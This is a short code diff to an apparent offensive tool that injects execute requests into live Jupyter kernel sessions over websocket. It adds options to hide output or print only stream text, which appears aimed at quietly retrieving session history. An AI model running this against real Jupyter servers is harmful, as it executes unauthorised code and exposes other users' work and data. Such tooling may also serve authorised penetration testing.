@@ -4,7 +4,7 @@ import json
 from urllib.parse import urlparse
 from websockets import connect
 
-async def attack_session(connection, session, code, silent=False):
+async def attack_session(connection, session, code, silent=False, print_out=True, get_hist=False):
     jpy_sess = connection.jpy_sessions[session]
     code_msg_id = str(uuid.uuid1())
     code_msg = {'channel': 'shell',
@@ -17,8 +17,11 @@ async def attack_session(connection, session, code, silent=False):
             try:
                 async with asyncio.timeout(1):
                     msg = json.loads(await conn.recv())
+                    if get_hist and msg['msg_type'] == "stream":
+                                connection.con.print(msg['content']['text'])
                     if "status" not in msg["msg_type"]:
-                        connection.con.print(f"  type: {msg['msg_type']:16} content: {msg['content']}")
+                        if print_out:
+                            connection.con.print(f"  type: {msg['msg_type']:16} content: {msg['content']}")  
             except:
                 break
 
@@ -27,7 +30,7 @@ async def attack_session(connection, session, code, silent=False):
 
     async with connect(ws_url, extra_headers=connection.headers, close_timeout=5) as conn:
         await recv_all(conn)
-        print(f'\nSending execute_request\n')
-        connection.con.print(code_msg)
+        if print_out:
+            connection.con.print(code_msg)
         await conn.send(json.dumps(code_msg))
         return await recv_all(conn)
